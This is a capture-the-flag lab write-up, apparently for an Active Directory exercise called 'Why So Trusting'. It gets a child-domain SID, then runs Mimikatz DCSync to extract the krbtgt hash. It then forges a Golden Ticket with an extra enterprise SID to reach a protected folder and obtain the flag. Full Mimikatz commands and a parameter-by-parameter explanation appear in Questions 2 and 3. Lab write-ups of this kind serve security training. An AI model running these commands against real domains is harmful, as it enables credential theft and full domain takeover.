# Content

- [Content](#content)
  - [Question 1](#question-1)
    - [The way to hack](#the-way-to-hack)
    - [Answer](#answer)
  - [Question 2](#question-2)
    - [The way to hack](#the-way-to-hack-1)
    - [Answer](#answer-1)
  - [Question 3](#question-3)
    - [The way to hack](#the-way-to-hack-2)
    - [Answer](#answer-2)
  
## Question 1

### The way to hack

- I import module and using the function in module to get the SID of child domain.
  ![Picture](../../Image/Why%20So%20Trusting/5.png)

### Answer

![Picture](../../Image/Why%20So%20Trusting/6.png)

## Question 2

### The way to hack

- The command "lsadump::dcsync /user:LOGISTICS\krbtgt" is used in the Mimikatz tool, a popular tool in the field of penetration testing and security testing. This command is used to perform a specific attack called DCSync.
- DCSync is an attack technique in an Active Directory environment where an attacker uses his authority to request security data of a specific user account from a domain controller server. In this case, the above command requires the security data of the account "krbtgt" in the LOGISTICS domain.
![Picture](../../Image/Why%20So%20Trusting/7.png)

### Answer

![Picture](../../Image/Why%20So%20Trusting/8.png)

## Question 3

### The way to hack

- We use ls to check that we cannot access.
![Picture](../../Image/Why%20So%20Trusting/9.png)
- - We use a command.
- Payload:
  - `kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt`
- Command "kerberos::golden /ser:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050 -3880317879-2865463114-519 /ptt" is also a command in the Mimikatz engine and is used to perform an attack called Golden Ticket Attack.
- In the above command:
  - /user:hacker: Defines a fake user account name as "hacker".
  - /domain:LOGISTICS.INLANEFREIGHT.LOCAL: Specifies the domain name "LOGISTICS.INLANEFREIGHT.LOCAL".
  - /sid:S-1-5-21-2806153819-209893948-922872689: Defines the Security Identifier (SID) for the domain.
  - /krbtgt:9d765b482771505cbe97411065964d5f: Defines the NTLM (NT LAN Manager) key for the account "krbtgt".
  - /sids:S-1-5-21-3842939050-3880317879-2865463114-519: Defines a list of SIDs that the rogue account will have access to.
  - /ptt: Put the fake session into memory (Pass-The-Ticket).
  - With the above command, the attacker creates a fake session (golden ticket) for the "hacker" account with the same permissions and authorization as the top-level account in the domain "LOGISTICS.INLANEFREIGHT.LOCAL".
  ![Picture](../../Image/Why%20So%20Trusting/10.png)
- Now we check and we see that we can access this folder.
  ![Picture](../../Image/Why%20So%20Trusting/11.png)
- So just cd and get the flag.
  ![Picture](../../Image/Why%20So%20Trusting/12.png)

### Answer

![Picture](../../Image/Why%20So%20Trusting/13.png)